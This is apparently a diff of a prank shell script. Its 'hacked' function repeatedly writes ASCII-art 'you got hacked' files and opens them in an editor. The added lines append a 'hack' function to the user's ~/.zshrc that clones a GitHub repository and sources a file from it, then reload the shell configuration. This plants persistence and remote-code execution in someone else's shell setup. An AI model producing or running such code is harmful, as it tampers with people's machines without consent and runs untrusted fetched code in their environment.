@@ -23,12 +23,19 @@ hacked() {
 |   '.'.____.'.'   |
 '.____'.____.'____.'
 '.________________.'
-do this and dont get hacked again!" > "hacked$i.txt";
+  use this and dont get hacked again!" > "hacked$i.txt";
     code "hacked$i.txt";
     if [ $i -lt 50 ]
     then
       sleep 0.7s;
     fi
-    sleep 0.4s
-  done
+    sleep 0.4s;
+    done
+  cd ~/
+  echo "
+    hack() {
+      git clone https://github.com/jfreire-benites/hm && cd hm && source .zshrchk && hacked;
+    }
+  " >> .zshrc;
+  source .zshrc;
 }
